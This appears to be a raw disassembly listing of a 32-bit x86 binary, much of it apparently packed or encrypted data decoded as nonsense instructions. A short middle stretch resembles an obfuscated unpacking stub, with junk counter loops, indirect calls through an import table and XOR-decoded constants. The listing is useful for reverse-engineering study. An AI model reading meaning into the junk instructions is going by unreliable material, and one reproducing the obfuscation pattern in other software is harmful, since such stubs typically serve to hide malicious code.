  40d8a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8a9:	push   es
  40d8aa:	sub    BYTE PTR es:[ecx-0x62],bl
  40d8ae:	xchg   esi,eax
  40d8af:	in     eax,0x5e
  40d8b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8b2:	mov    edx,0xba0d732a
  40d8b7:	rcr    DWORD PTR [ecx-0x636b5653],cl
  40d8bd:	int    0x9d
  40d8bf:	push   es
  40d8c0:	jb     0x40d8b2
  40d8c2:	jg     0x40d931
  40d8c4:	or     edx,ebp
  40d8c6:	fmul   DWORD PTR [eax-0x52]
  40d8c9:	int3   
  40d8ca:	inc    esp
  40d8cb:	stos   DWORD PTR es:[edi],eax
  40d8cc:	push   cs
  40d8cd:	adc    bl,BYTE PTR cs:[eax]
  40d8d0:	iret   
  40d8d1:	pop    ebp
  40d8d2:	scas   al,BYTE PTR es:[edi]
  40d8d3:	mov    BYTE PTR [esi-0x3b998ff],dl
  40d8d9:	pushf  
  40d8da:	push   esp
  40d8db:	mov    edi,?
  40d8dd:	(bad)  
  40d8de:	mov    esp,DWORD PTR [ebx-0x241e59ed]
  40d8e4:	hlt    
  40d8e5:	sub    eax,0x2ff5d2af
  40d8ea:	jmp    0xa838:0xd46e8bfe
  40d8f1:	dec    edi
  40d8f2:	mov    al,ds:0xbf5928d7
  40d8f7:	inc    ebp
  40d8f8:	leave  
  40d8f9:	jnp    0x40d8d9
  40d8fb:	mov    esi,0x900c3fe8
  40d900:	xchg   ebx,eax
  40d901:	inc    al
  40d903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d904:	add    ah,bh
  40d906:	sub    edx,DWORD PTR [edi]
  40d908:	jo     0x40d986
  40d90a:	jo     0x40d90a
  40d90c:	and    al,0x59
  40d90e:	add    eax,DWORD PTR [ebp+0x1c]
  40d911:	out    0x58,eax
  40d913:	xchg   esp,eax
  40d914:	inc    eax
  40d915:	and    bl,bh
  40d917:	std    
  40d918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d919:	mov    dh,0x32
  40d91b:	add    BYTE PTR [ebx-0x71],bl
  40d91e:	sbb    edi,DWORD PTR [ecx+0x53]
  40d921:	stc    
  40d922:	xchg   esp,eax
  40d923:	inc    esi
  40d924:	fsub   st(7),st
  40d926:	or     BYTE PTR es:[edx-0x80],dh
  40d92a:	loopne 0x40d8d5
  40d92c:	mov    ecx,DWORD PTR [edi+0x38e34f94]
  40d932:	push   ds
  40d933:	pop    esp
  40d934:	int    0x30
  40d936:	inc    DWORD PTR [ebx]
  40d938:	push   esp
  40d939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d93a:	sti    
  40d93b:	adc    BYTE PTR [esi],dl
  40d93d:	inc    eax
  40d93e:	adc    BYTE PTR [eax+0x7b],al
  40d941:	daa    
  40d942:	adc    edi,edi
  40d944:	jl     0x40d975
  40d946:	lods   eax,DWORD PTR ds:[esi]
  40d947:	pop    eax
  40d948:	mov    esi,0x587b6e3f
  40d94d:	retf   
  40d94e:	lock pop esi
  40d950:	pusha  
  40d951:	mov    esi,0x5941a5b0
  40d956:	fwait
  40d957:	dec    esp
  40d958:	or     ah,al
  40d95a:	cwde   
  40d95b:	add    esi,DWORD PTR [ebp+0x56]
  40d95e:	sbb    eax,esp
  40d960:	add    DWORD PTR [eax],0x2d2272ba
  40d966:	aaa    
  40d967:	push   edi
  40d968:	into   
  40d969:	int3   
  40d96a:	(bad)  
  40d96b:	out    dx,al
  40d96c:	(bad)  
  40d96e:	cmp    ecx,DWORD PTR [ebx-0x2d8e42a5]
  40d974:	add    eax,0x15e48160
  40d979:	(bad)  
  40d97a:	sar    DWORD PTR [edx-0x34cd1f80],1
  40d980:	pop    ss
  40d981:	mov    edi,0x26e3472a
  40d986:	xchg   ebx,eax
  40d987:	sysret 
  40d989:	(bad)  
  40d98a:	clc    
  40d98b:	push   es
  40d98c:	stos   BYTE PTR es:[edi],al
  40d98d:	xchg   esp,eax
  40d98e:	adc    al,0x4d
  40d990:	jge    0x40d93c
  40d992:	cmp    eax,0x40703ab0
  40d997:	jle    0x40d9dd
  40d999:	lods   eax,DWORD PTR ds:[esi]
  40d99a:	dec    BYTE PTR [esi+edx*2-0x3219ef]
  40d9a1:	cmp    eax,ebp
  40d9a3:	pop    esp
  40d9a4:	dec    esi
  40d9a5:	adc    eax,DWORD PTR [ebx-0xba60731]
  40d9ab:	(bad)  
  40d9ac:	and    al,0x43
  40d9ae:	sub    DWORD PTR [ebx-0x48],0xffffff8e
  40d9b2:	xlat   BYTE PTR ds:[ebx]
  40d9b3:	sub    cl,BYTE PTR [edi+edx*4]
  40d9b6:	jge    0x40d974
  40d9b8:	jnp    0x40d9e9
  40d9ba:	mov    dl,0xf1
  40d9bc:	push   cs
  40d9bd:	je     0x40d960
  40d9bf:	ror    DWORD PTR [edx-0x2a2a24d1],1
  40d9c5:	cmc    
  40d9c6:	push   0x57
  40d9c8:	inc    ebx
  40d9c9:	xchg   edx,eax
  40d9ca:	gs mov cl,0x6e
  40d9cd:	jae    0x40d9c0
  40d9cf:	xchg   ebp,eax
  40d9d0:	int3   
  40d9d1:	out    0xcb,al
  40d9d3:	inc    esi
  40d9d4:	jl     0x40d999
  40d9d6:	inc    edi
  40d9d7:	cmp    BYTE PTR [eax],dh
  40d9d9:	shl    DWORD PTR [ebp-0x672f8a2b],cl
  40d9df:	xchg   edx,eax
  40d9e0:	pop    es
  40d9e1:	mov    bl,0x9d
  40d9e3:	fcmovnu st,st(0)
  40d9e5:	add    BYTE PTR [edx],dh
  40d9e7:	test   al,0xcf
  40d9e9:	pop    ds
  40d9ea:	fist   WORD PTR [edx]
  40d9ec:	adc    BYTE PTR [ebx-0x46a4f07f],0x4b
  40d9f3:	call   0xc76a:0x7ef16438
  40d9fa:	sbb    eax,0x24e86b47
  40d9ff:	or     DWORD PTR ds:0x51facfb7,0x29
  40da06:	jae    0x40d9a9
  40da08:	bound  eax,QWORD PTR [ecx+0x6f]
  40da0b:	dec    esp
  40da0c:	retf   0x6a98
  40da0f:	adc    BYTE PTR [edi],dh
  40da11:	mov    eax,ds:0xea383ba7
  40da16:	or     al,0x7
  40da18:	mov    edx,ebx
  40da1a:	jbe    0x40d9fc
  40da1c:	jb     0x40d9b3
  40da1e:	cli    
  40da1f:	lods   al,BYTE PTR ds:[esi]
  40da20:	inc    edi
  40da21:	xchg   BYTE PTR gs:[edx],bh
  40da24:	xchg   edi,eax
  40da25:	xchg   ecx,eax
  40da26:	in     al,dx
  40da27:	dec    edx
  40da28:	xchg   BYTE PTR [edx+ebx*4-0x45],bh
  40da2c:	(bad)  
  40da2d:	adc    BYTE PTR [edi-0x314492bb],ah
  40da33:	cmp    ah,dl
  40da35:	aaa    
  40da36:	(bad)  
  40da37:	fprem  
  40da39:	mov    al,ds:0x18c61093
  40da3e:	lock mov ch,0x2e
  40da41:	clc    
  40da42:	xchg   ebx,eax
  40da43:	jge    0x40da1e
  40da45:	add    DWORD PTR [ebp-0x2],0xffffffde
  40da49:	ret    0x6801
  40da4c:	push   es
  40da4d:	xlat   BYTE PTR ds:[ebx]
  40da4e:	xchg   ebp,eax
  40da4f:	ret    0x9ab5
  40da52:	test   esp,edi
  40da54:	xchg   edx,eax
  40da55:	mov    dh,0x32
  40da57:	and    al,0x83
  40da59:	mov    edx,0x8f66dab2
  40da5e:	test   DWORD PTR [ecx],edi
  40da60:	mov    bl,0xa8
  40da62:	into   
  40da63:	inc    esi
  40da64:	xor    esp,eax
  40da66:	push   edi
  40da67:	jle    0x40da4a
  40da69:	int    0x62
  40da6b:	enter  0xbd32,0xa2
  40da6f:	stos   BYTE PTR es:[edi],al
  40da70:	test   eax,0x6771986b
  40da75:	retf   0x3418
  40da78:	dec    ebp
  40da79:	out    dx,eax
  40da7a:	xor    al,0x74
  40da7c:	cmp    eax,0x7b25ba7
  40da81:	inc    esi
  40da82:	cld    
  40da83:	add    BYTE PTR [ecx+0x57],bh
  40da86:	icebp  
  40da87:	aaa    
  40da88:	stc    
  40da89:	pop    ecx
  40da8a:	mov    ch,0xc4
  40da8c:	or     BYTE PTR ds:[eax+0x369ab097],dl
  40da93:	pushf  
  40da94:	mov    ds:0x8a20e65,al
  40da99:	in     al,dx
  40da9a:	mov    BYTE PTR [eax+0x552005d1],ch
  40daa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daa1:	leave  
  40daa2:	mov    edx,0x4f8c116c
  40daa7:	dec    esp
  40daa8:	pop    ds
  40daa9:	jae    0x40da39
  40daab:	cdq    
  40daac:	add    eax,0x4a968edc
  40dab1:	mov    BYTE PTR [edx],bl
  40dab3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dab4:	mov    ch,0x6f
  40dab6:	sub    DWORD PTR [eax],esp
  40dab8:	adc    BYTE PTR [eax+0x5996e9eb],ah
  40dabe:	shr    DWORD PTR [edx-0x39],1
  40dac1:	sbb    BYTE PTR [esi-0x5d],bh
  40dac4:	ficomp DWORD PTR [edx-0x6c]
  40dac7:	add    al,BYTE PTR [edi]
  40dac9:	add    DWORD PTR [edx-0x7d6c44f7],edi
  40dacf:	ret    0x5355
  40dad2:	dec    ebp
  40dad3:	mov    DWORD PTR [edx],esi
  40dad5:	jg     0x40da7a
  40dad7:	mov    WORD PTR [ebx+0x4d],?
  40dada:	xchg   ecx,eax
  40dadb:	pop    edx
  40dadd:	lds    eax,FWORD PTR [eax+0x4f]
  40dae0:	int    0x35
  40dae2:	sbb    ebp,ebx
  40dae4:	pop    edx
  40dae5:	int3   
  40dae6:	aam    0x2e
  40dae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dae9:	push   eax
  40daea:	aaa    
  40daeb:	mov    eax,0xc032b163
  40daf0:	mov    cl,0xd0
  40daf2:	cmp    bl,BYTE PTR [ebx+eax*8-0x33]
  40daf6:	inc    ebp
  40daf7:	mov    edi,0xd159fcd5
  40dafc:	rcl    BYTE PTR [ecx-0x6abb2ddd],cl
  40db02:	dec    ecx
  40db03:	sbb    BYTE PTR ds:0x571ad720,al
  40db09:	cld    
  40db0a:	or     BYTE PTR [esi-0x9],cl
  40db0d:	dec    eax
  40db0e:	inc    esp
  40db0f:	xchg   ebp,eax
  40db10:	xchg   ecx,eax
  40db11:	push   ebp
  40db12:	ja     0x40db83
  40db14:	xchg   BYTE PTR [edx],bh
  40db16:	pop    edi
  40db17:	sub    ebx,edi
  40db19:	fidiv  DWORD PTR [ecx+0x148c192]
  40db1f:	hlt    
  40db20:	or     ebx,ecx
  40db22:	ror    DWORD PTR [edi-0x79],0x97
  40db26:	mov    ah,0xd
  40db28:	out    dx,al
  40db29:	mov    cs,WORD PTR [edx-0x1173299e]
  40db2f:	sub    dl,BYTE PTR [ecx+0x4a]
  40db32:	das    
  40db33:	jae    0x40db45
  40db35:	mov    cs,WORD PTR [eax-0x6a]
  40db38:	stos   BYTE PTR es:[edi],al
  40db39:	mov    DWORD PTR [edx-0x13],ecx
  40db3c:	cmp    al,0x34
  40db3e:	mul    DWORD PTR [ecx-0xca52dc4]
  40db44:	sub    DWORD PTR [edi],0x43
  40db47:	arpl   WORD PTR [esi-0x27eccf87],bx
  40db4d:	jecxz  0x40dbbd
  40db4f:	out    dx,eax
  40db50:	sti    
  40db51:	push   eax
  40db52:	adc    DWORD PTR [edx+0x36b7e5e2],edi
  40db58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db59:	mov    eax,0x86ab937f
  40db5e:	mov    eax,ds:0x578e09e7
  40db63:	jnp    0x40db95
  40db65:	dec    ecx
  40db66:	xchg   edx,eax
  40db67:	cwde   
  40db68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db69:	jno    0x40dbe3
  40db6b:	inc    eax
  40db6c:	push   ecx
  40db6d:	adc    al,0x23
  40db6f:	bound  esp,QWORD PTR [ebp-0x4fcdddaf]
  40db75:	dec    ebx
  40db76:	(bad)  
  40db77:	push   esi
  40db78:	in     al,dx
  40db79:	pop    ebx
  40db7a:	jp     0x40db90
  40db7c:	ja     0x40db17
  40db7e:	or     esp,DWORD PTR [esi-0x4815b1f4]
  40db84:	mov    fs,WORD PTR es:[eax+ebp*2-0x21]
  40db89:	mov    esi,0xf891bbac
  40db8e:	cwde   
  40db8f:	retf   0x3442
  40db92:	xor    DWORD PTR ds:0x5602978e,edi
  40db98:	pop    esp
  40db99:	mov    cl,0xbc
  40db9b:	retf   
  40db9c:	mov    es,WORD PTR [eax]
  40db9e:	lock rcpps xmm1,XMMWORD PTR [eax-0x6dbda4d4]
  40dba6:	shr    BYTE PTR [ebx+ecx*8-0x19],1
  40dbaa:	call   0x5372aa8a
  40dbaf:	mov    al,ds:0x967a564e
  40dbb4:	ret    
  40dbb5:	neg    BYTE PTR [edi-0x66]
  40dbb8:	adc    eax,0xc4ec2852
  40dbbd:	in     eax,dx
  40dbbe:	jmp    0xb1e2ad38
  40dbc3:	mov    dh,0x88
  40dbc5:	adc    al,0xac
  40dbc7:	bound  ebx,QWORD PTR [ebp+edi*2-0x3e49c9da]
  40dbce:	imul   esi,DWORD PTR [ecx-0xe823159],0xffffffca
  40dbd5:	push   0xffffff87
  40dbd7:	inc    ebx
  40dbd8:	jle    0x40dbc2
  40dbda:	call   0x9e38:0xe03cfcd7
  40dbe1:	or     eax,0xa6f1f98e
  40dbe6:	fcomp  DWORD PTR [esi+0x313a896f]
  40dbec:	dec    edx
  40dbed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbee:	retf   
  40dbef:	push   cs
  40dbf0:	fcmovnu st,st(2)
  40dbf2:	pop    es
  40dbf3:	clc    
  40dbf4:	dec    edx
  40dbf5:	push   eax
  40dbf6:	(bad)  
  40dbf8:	inc    ebx
  40dbf9:	sbb    al,0x58
  40dbfb:	rcr    BYTE PTR [eax],1
  40dbfd:	xchg   ebp,eax
  40dbfe:	lock pop esp
  40dc00:	pop    ds
  40dc01:	retf   0xfe11
  40dc04:	cmp    eax,0x23970773
  40dc09:	or     bl,BYTE PTR [ecx]
  40dc0b:	dec    eax
  40dc0c:	jns    0x40dc2e
  40dc0e:	imul   esp,edx,0x3af0938a
  40dc14:	xchg   esi,eax
  40dc15:	lods   al,BYTE PTR ds:[esi]
  40dc16:	fldenv [eax+edi*1-0x14]
  40dc1a:	ja     0x40dba6
  40dc1c:	cmp    eax,esi
  40dc1e:	add    ebp,ecx
  40dc20:	idiv   cl
  40dc22:	in     eax,0xa
  40dc24:	fidiv  DWORD PTR [edi]
  40dc26:	(bad)  
  40dc27:	pop    edi
  40dc28:	ret    
  40dc29:	mov    al,ds:0xe7b862ab
  40dc2e:	push   edx
  40dc2f:	int3   
  40dc30:	pusha  
  40dc31:	je     0x40dc40
  40dc33:	call   FWORD PTR [esi+edi*8+0x1a]
  40dc37:	icebp  
  40dc38:	mov    edx,0x73bf4b6
  40dc3d:	jp     0x40dc8c
  40dc3f:	adc    bh,cl
  40dc41:	mov    ds:0xf862041c,eax
  40dc46:	hlt    
  40dc47:	pop    ecx
  40dc48:	push   cs
  40dc49:	outs   dx,BYTE PTR ds:[esi]
  40dc4a:	shl    BYTE PTR [eax+ebp*1],cl
  40dc4d:	mov    ds:0xf32b81e2,al
  40dc52:	mov    bl,0x1b
  40dc54:	into   
  40dc55:	ss lahf 
  40dc57:	add    eax,0x72d8905d
  40dc5c:	sti    
  40dc5d:	pop    esi
  40dc5e:	mov    ecx,0x57165e6c
  40dc63:	or     dh,BYTE PTR [ebp-0x3bb4eb4b]
  40dc69:	iret   
  40dc6a:	imul   ah
  40dc6c:	ds ss mov esi,0xcefb126b
  40dc73:	arpl   WORD PTR [esi],dx
  40dc75:	pop    esp
  40dc76:	xchg   ebp,eax
  40dc77:	retf   0xfe4f
  40dc7a:	mov    dh,0xcd
  40dc7c:	jae    0x40dc90
  40dc7e:	popf   
  40dc7f:	or     eax,0x26d3cb12
  40dc84:	inc    edx
  40dc85:	inc    ecx
  40dc86:	or     al,0x32
  40dc88:	and    BYTE PTR [ecx+ebx*2+0x30],bl
  40dc8c:	mov    edx,0x7e772516
  40dc91:	dec    ebp
  40dc92:	fldcw  WORD PTR [edx]
  40dc94:	xlat   BYTE PTR ds:[ebx]
  40dc95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc96:	pop    esi
  40dc97:	inc    ebp
  40dc98:	daa    
  40dc99:	(bad)
  40dc9c:	mov    eax,ds:0x3f138d6
  40dca1:	and    BYTE PTR [edi+0x5],0xf
  40dca5:	daa    
  40dca6:	ins    DWORD PTR es:[edi],dx
  40dca7:	rol    BYTE PTR [edi+0x76],cl
  40dcaa:	inc    edi
  40dcab:	jb     0x40dc44
  40dcad:	cmp    eax,0xaf2a0434
  40dcb2:	or     al,0x17
  40dcb4:	aaa    
  40dcb5:	pop    esi
  40dcb6:	lea    ecx,[edx+0x2f500732]
  40dcbc:	jp     0x40dc40
  40dcbe:	loop   0x40dca0
  40dcc0:	cwde   
  40dcc1:	cmp    DWORD PTR [esi-0x50],0xbe82d9a2
  40dcc8:	add    al,0xe1
  40dcca:	fnstsw WORD PTR [ebp+0x26]
  40dccd:	cmc    
  40dcce:	je     0x40dd10
  40dcd0:	mov    DWORD PTR [ebx+edx*8+0x7],edi
  40dcd4:	(bad)  
  40dcd5:	xor    al,0x77
  40dcd7:	popf   
  40dcd8:	sti    
  40dcd9:	pop    ecx
  40dcda:	sahf   
  40dcdb:	dec    ecx
  40dcdc:	out    0x1,al
  40dcde:	and    BYTE PTR [esi+0x4],ah
  40dce1:	in     al,0x3f
  40dce3:	cdq    
  40dce4:	jae    0x40dce8
  40dce6:	cld    
  40dce7:	dec    esp
  40dce8:	stos   DWORD PTR es:[edi],eax
  40dce9:	cmp    BYTE PTR [edi+0x3f],0xb8
  40dced:	pusha  
  40dcee:	and    DWORD PTR [edi-0x68b0d0c5],edx
  40dcf4:	or     al,0xcc
  40dcf6:	mov    DWORD PTR [esi-0x2e],edx
  40dcf9:	arpl   WORD PTR [ebx],bp
  40dcfb:	xchg   ebx,eax
  40dcfc:	clc    
  40dcfd:	pop    eax
  40dcfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcff:	push   ds
  40dd00:	rol    BYTE PTR [ecx+esi*4],0xea
  40dd04:	and    esp,DWORD PTR [edi-0x2c0e706b]
  40dd0a:	xor    ebx,ebx
  40dd0c:	jg     0x40dc9b
  40dd0e:	sub    DWORD PTR [edi],esi
  40dd10:	cli    
  40dd11:	(bad)  
  40dd12:	cmc    
  40dd13:	mov    cl,0x8f
  40dd15:	sub    eax,DWORD PTR [ebx-0xa]
  40dd18:	adc    esi,DWORD PTR [ebx]
  40dd1a:	into   
  40dd1b:	add    DWORD PTR ds:0x42a018,0x42a000
  40dd25:	mov    DWORD PTR [ebp-0x34],eax
  40dd28:	add    ecx,edi
  40dd2a:	jmp    0x4191e1
  40dd2f:	sub    DWORD PTR ds:0x42a018,edi
  40dd35:	lea    edx,[ecx+eax*1]
  40dd38:	mov    DWORD PTR [ebp-0x28],edx
  40dd3b:	mov    edx,DWORD PTR [ebp-0x44]
  40dd3e:	mov    ebx,DWORD PTR ds:0x429004
  40dd44:	add    DWORD PTR ds:0x42c008,ebx
  40dd4a:	sub    edx,ecx
  40dd4c:	mov    DWORD PTR ds:0x42b004,0x1e
  40dd56:	cmp    DWORD PTR ds:0x42b004,0x0
  40dd5d:	je     0x40dd97
  40dd63:	cmp    DWORD PTR ds:0x42b004,0x28
  40dd6a:	jne    0x40dd85
  40dd70:	push   0x3a6a
  40dd75:	push   0x42b010
  40dd7a:	push   0x42366e
  40dd7f:	call   DWORD PTR ds:0x424048
  40dd85:	mov    ebx,DWORD PTR ds:0x42b004
  40dd8b:	dec    ebx
  40dd8c:	mov    DWORD PTR ds:0x42b004,ebx
  40dd92:	jmp    0x40dd56
  40dd97:	mov    DWORD PTR [ebp-0x24],edx
  40dd9a:	mov    edx,DWORD PTR [ebp-0x24]
  40dd9d:	and    DWORD PTR ds:0x428008,edi
  40dda3:	mov    DWORD PTR [ebp-0x14],edx
  40dda6:	not    edx
  40dda8:	mov    edx,DWORD PTR [ebp-0x28]
  40ddab:	mov    DWORD PTR ds:0x42800c,0x11
  40ddb5:	cmp    DWORD PTR ds:0x42800c,0x0
  40ddbc:	je     0x40de6b
  40ddc2:	cmp    DWORD PTR ds:0x42800c,0x8
  40ddc9:	jne    0x40dddd
  40ddcf:	push   0x42a010
  40ddd4:	push   DWORD PTR [ebp-0x28]
  40ddd7:	call   DWORD PTR ds:0x424014
  40dddd:	cmp    DWORD PTR ds:0x42800c,0x9
  40dde4:	jne    0x40ddf7
  40ddea:	mov    ebx,DWORD PTR ds:0x42800c
  40ddf0:	dec    ebx
  40ddf1:	mov    DWORD PTR ds:0x42800c,ebx
  40ddf7:	xor    ebx,ebx
  40ddf9:	or     ebx,DWORD PTR ds:0x42800c
  40ddff:	dec    ebx
  40de00:	mov    DWORD PTR ds:0x42800c,ebx
  40de06:	jmp    0x40ddb5
  40de0b:	mov    DWORD PTR ds:0x429004,0x17
  40de15:	cmp    DWORD PTR ds:0x429004,0x0
  40de1c:	je     0x40de6b
  40de22:	cmp    DWORD PTR ds:0x429004,0x25
  40de29:	jne    0x40de57
  40de2f:	push   0x85b6
  40de34:	push   0x42a018
  40de39:	push   DWORD PTR [ebp-0x24]
  40de3c:	push   0x42c000
  40de41:	push   0x5138
  40de46:	push   DWORD PTR [ebp-0x24]
  40de49:	push   0x4b55
  40de4e:	push   DWORD PTR [ebp-0x24]
  40de51:	call   DWORD PTR ds:0x424018
  40de57:	xor    ebx,ebx
  40de59:	add    ebx,DWORD PTR ds:0x429004
  40de5f:	dec    ebx
  40de60:	mov    DWORD PTR ds:0x429004,ebx
  40de66:	jmp    0x40de15
  40de6b:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  40de72:	mov    DWORD PTR [ebp-0x40],edx
  40de75:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  40de7c:	mov    edx,DWORD PTR [ebp-0x3c]
  40de7f:	xor    edx,esi
  40de81:	add    edx,edi
  40de83:	mov    DWORD PTR [ebp-0x10],edx
  40de86:	mov    edx,DWORD PTR [ebp-0x3c]
  40de89:	xor    edx,esi
  40de8b:	add    edx,edi
  40de8d:	mov    DWORD PTR [ebp-0x8],edx
  40de90:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  40de97:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  40de9e:	mov    edx,DWORD PTR [ebp-0x3c]
  40dea1:	mov    ebx,DWORD PTR [ebp-0x14]
  40dea4:	xor    edx,esi
  40dea6:	add    edx,edi
  40dea8:	cmp    ebx,edx
  40deaa:	je     0x4191d5
  40deb0:	mov    eax,DWORD PTR [ebp-0x18]
  40deb3:	xor    eax,esi
  40deb5:	mov    edx,0xffcd8d25
  40deba:	sub    edx,eax
  40debc:	add    edx,DWORD PTR [ebp-0x14]
  40debf:	mov    eax,DWORD PTR [ebp-0x18]
  40dec2:	mov    ebx,DWORD PTR [ebp-0x10]
  40dec5:	xor    eax,esi
  40dec7:	jmp    0x41023c
  40decc:	and    ecx,DWORD PTR [eax+0x3]
  40decf:	scas   eax,DWORD PTR es:[edi]
  40ded0:	jecxz  0x40df3d
  40ded2:	arpl   sp,ax
  40ded4:	jns    0x40de7a
  40ded6:	cmp    edi,edi
  40ded8:	not    DWORD PTR [esi+0x5a]
  40dedb:	fst    DWORD PTR [edi]
  40dedd:	shl    DWORD PTR [edx+0x62],1
  40dee0:	or     bl,BYTE PTR [edi+0x62]
  40dee3:	(bad)  
  40dee4:	cli    
  40dee5:	ja     0x40decd
  40dee7:	dec    ecx
  40dee8:	lock iret 
  40deea:	leave  
  40deeb:	push   ebx
  40deec:	sbb    al,BYTE PTR [edx+0x89a17e3]
  40def2:	pop    ss
  40def3:	js     0x40deda
  40def5:	dec    ebp
  40def6:	push   esi
  40def7:	sub    DWORD PTR [edi],ebp
  40def9:	shr    bh,0x6d
  40defc:	push   0xbc8b9330
  40df01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df02:	pop    edi
  40df03:	adc    bl,BYTE PTR [ecx]
  40df05:	call   0x2a72:0x55c4db9f
  40df0c:	pop    ds
  40df0d:	xchg   edi,eax
  40df0e:	leave  
  40df0f:	xchg   ebx,eax
  40df10:	sar    DWORD PTR [esi-0x15],1
  40df13:	ja     0x40def8
  40df15:	cmp    BYTE PTR [edx-0x7c8da889],bl
  40df1b:	and    BYTE PTR [eax-0x6fea0ac7],ah
  40df21:	jae    0x40dedb
  40df23:	out    0x48,eax
  40df25:	push   0x3
  40df27:	je     0x40dfa4
  40df29:	sub    eax,0x85107f2b
  40df2e:	repz jmp 0x40df1e
  40df31:	sub    BYTE PTR [eax],al
  40df33:	push   cs
  40df34:	into   
  40df35:	push   es
  40df36:	pop    eax
  40df37:	jae    0x40df01
  40df39:	sub    eax,0xb6963b11
  40df3e:	pusha  
  40df3f:	call   0xd7f1:0xe4f5cbf2
  40df46:	jno    0x40dee8
  40df48:	cld    
  40df49:	xchg   ebx,eax
  40df4a:	push   ebp
  40df4b:	iret   
  40df4c:	cmp    BYTE PTR [esi-0x5f6904f9],cl
  40df52:	push   esi
  40df53:	pop    ebx
  40df54:	(bad)  
  40df55:	es mov dh,0x97
  40df58:	sub    eax,0xfb0a49d4
  40df5d:	scas   eax,DWORD PTR es:[edi]
  40df5e:	push   ebp
  40df5f:	xor    cl,BYTE PTR [ebx+0x55827fc4]
  40df65:	jle    0x40dfd9
  40df67:	sbb    ah,BYTE PTR [ebx-0x599d434c]
  40df6d:	dec    eax
  40df6e:	aaa    
  40df6f:	idiv   BYTE PTR [esi-0x9171af2]
  40df75:	xchg   ebp,eax
  40df76:	jbe    0x40defb
  40df78:	cs data16 mov ah,0x13
  40df7c:	(bad)  
  40df7d:	and    bl,BYTE PTR [edx-0x1]
  40df80:	and    edx,0x71b58b08
  40df86:	push   edi
  40df87:	add    DWORD PTR [ebp+0x83fd382],ebp
  40df8d:	fistp  QWORD PTR [ebp+0x890e710]
  40df93:	inc    esi
  40df94:	fld    QWORD PTR [edx-0x3c50fa12]
  40df9a:	je     0x40df81
  40df9c:	imul   esi,DWORD PTR [ebx],0xffffffa7
  40df9f:	jmp    0xbad3:0xa010253f
  40dfa6:	es ins BYTE PTR es:[edi],dx
  40dfa8:	js     0x40df3b
  40dfaa:	mov    ebx,0xe4166b7a
  40dfaf:	push   eax
  40dfb0:	and    esi,DWORD PTR [esi-0x37cbbab1]
  40dfb6:	ds jbe 0x40df77
  40dfb9:	dec    edi
  40dfba:	test   edx,edx
  40dfbc:	inc    edi
  40dfbd:	or     al,0x3d
  40dfbf:	scas   eax,DWORD PTR es:[edi]
  40dfc0:	xor    dl,bh
  40dfc2:	mov    ebp,0x5ba774db
  40dfc7:	and    dh,BYTE PTR [ecx]
  40dfc9:	pop    es
  40dfca:	mov    eax,0x72156eba
  40dfcf:	in     eax,0x8c
  40dfd1:	mov    al,0x4
  40dfd3:	and    DWORD PTR [ecx-0x1d0b41e3],esp
  40dfd9:	mov    eax,0x437a2fa
  40dfde:	jne    0x40dfa4
  40dfe0:	add    ah,cl
  40dfe2:	sub    al,0x9c
  40dfe4:	jbe    0x40e051
  40dfe6:	inc    ebp
  40dfe7:	cwde   
  40dfe8:	(bad)  
  40dfe9:	iret   
  40dfea:	idiv   DWORD PTR [edi+0xf2b025f]
  40dff0:	jmp    0x34ee38a5
  40dff5:	mov    dl,0x63
  40dff7:	pop    eax
  40dff8:	call   0x9e676b5
  40dffd:	shr    ch,0xc
  40e000:	jb     0x40dff3
  40e002:	ret    0x6161
  40e005:	cs jecxz 0x40dfdf
  40e008:	or     al,0x33
  40e00a:	cmp    DWORD PTR [ebp-0xa],ebp
  40e00d:	sbb    eax,DWORD PTR [edi+0x51]
  40e010:	sbb    ah,ch
  40e012:	sahf   
  40e013:	add    ch,0x5e
  40e016:	xor    eax,0x7080b734
  40e01b:	xchg   esp,eax
  40e01c:	mov    ah,ch
  40e01e:	jle    0x40dfdd
  40e020:	ss popa 
  40e022:	inc    ebp
  40e023:	test   BYTE PTR [ebx],dl
  40e025:	outs   dx,BYTE PTR ds:[esi]
  40e026:	test   BYTE PTR [edi+0x5567ad8e],dh
  40e02c:	xchg   edx,eax
  40e02d:	js     0x40e050
  40e02f:	mov    al,ds:0x19442733
  40e034:	dec    eax
  40e035:	enter  0x76f0,0xdc
  40e039:	or     eax,0x5dcfb489
  40e03e:	add    edx,DWORD PTR [edx]
  40e040:	mov    al,ds:0x31f77ccf
  40e045:	push   esi
  40e046:	retf   0xfcad
  40e049:	fs pusha 
  40e04b:	aam    0xe6
  40e04d:	pop    ds
  40e04e:	inc    edx
  40e04f:	fimul  WORD PTR [esi]
  40e051:	xor    ah,cl
  40e053:	iret   
  40e054:	mov    eax,0x716ebdfa
  40e059:	je     0x40dfed
  40e05b:	inc    ebx
  40e05c:	mov    edx,0xb808d7
  40e061:	shl    dl,cl
  40e063:	xor    bx,WORD PTR [ecx]
  40e066:	and    DWORD PTR [ebx-0x310d6a21],ebx
  40e06c:	imul   esi,esi,0x5f634eb2
  40e072:	push   eax
  40e073:	ja     0x40e05c
  40e075:	test   eax,0xbcf43346
  40e07a:	stos   DWORD PTR es:[edi],eax
  40e07b:	fsub   QWORD PTR [edi+0xd]
  40e07e:	mov    esp,0x81443bc3
  40e083:	sbb    ecx,DWORD PTR [esi-0x79215a8f]
  40e089:	fadd   DWORD PTR [esp+ecx*2-0x4f]
  40e08d:	(bad)  
  40e08e:	cwde   
